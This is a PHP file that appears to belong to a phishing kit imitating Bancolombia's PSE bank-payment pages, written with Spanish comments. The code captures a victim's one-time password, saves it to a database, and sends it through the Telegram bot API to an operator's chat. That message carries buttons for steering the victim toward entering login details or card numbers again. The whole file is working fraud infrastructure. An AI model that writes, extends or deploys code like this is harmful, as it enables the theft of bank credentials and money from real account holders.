<?php

// Mobile check removed

?>
<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // 1. Cargar Configuración Global
    $config = require __DIR__ . '/../../../../config.php';

    if (!$config || !is_array($config)) {
        die("Error: No se pudo cargar la configuración.");
    }

    // Conectarse a la DB usando el archivo de conexion global db.php
    try {
        include __DIR__ . '/../../../../db.php'; // Esto define la variable $conn
        $pdo = $conn;
    } catch (Exception $e) {
        die("Error DB");
    }

    // Cargar config local de Bancolombia para Telegram y baseUrl
    $localConfigPath = __DIR__ . '/../../assets/config/conexion.php';
    $localConfig = file_exists($localConfigPath) ? require $localConfigPath : [];

    $bot_token = $localConfig['telegram']['bot_token'] ?? $config['botToken'];
    $chat_id = $localConfig['telegram']['chat_id'] ?? $config['chatId'];
    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/dinadatos/bancol/modules/api/actualizar_estado.php');
    $security_key = $config['security_key'];

    // 2. Recuperar datos
    $cliente_id = $_POST['cliente_id'] ?? null;
    $otp_array = $_POST['otp'] ?? [];
    $message = '';

    if (empty($cliente_id) || count($otp_array) < 1) { // Removed strict check for 6 digits for flexibility
        header("Location: ../../index.php");
        exit();
    }

    $submitted_otp = implode('', $otp_array);

    // 3. Actualizar
    try {
        $sql = "UPDATE pse SET estado = 1, otp = :otp WHERE id = :id"; // Usamos 6 o 0? Original usaba 0. Dejemos 6 (Data) o 0 (Wait). Update: Botones cambian el estado real. Aquí solo notificamos.
        // Si el usuario envia OTP, se queda esperando.
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['otp' => $submitted_otp, 'id' => $cliente_id]);

        $message = "✅ OTP Recibido ✅\n\n🆔 ID: {$cliente_id}\n🔐 OTP: {$submitted_otp}";

    } catch (PDOException $e) {
        $message = "⚠️ Error DB OTP ID: {$cliente_id}";
    }

    // 4. Buttons
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
            ],
            [
                ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
                ['text' => '💳 CC', 'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
            ],
            [
                ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
            ]
        ]
    ];

    $encoded_keyboard = json_encode($keyboard);

    // 5. Send
    if (!empty($message)) {
        $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message,
            'reply_markup' => $encoded_keyboard
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url_telegram);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    // 6. Redirect
    header("Location: ../../index.php?status=espera&id=" . $cliente_id);
    exit();

} else {
    header("Location: ../../index.php");
    exit();
}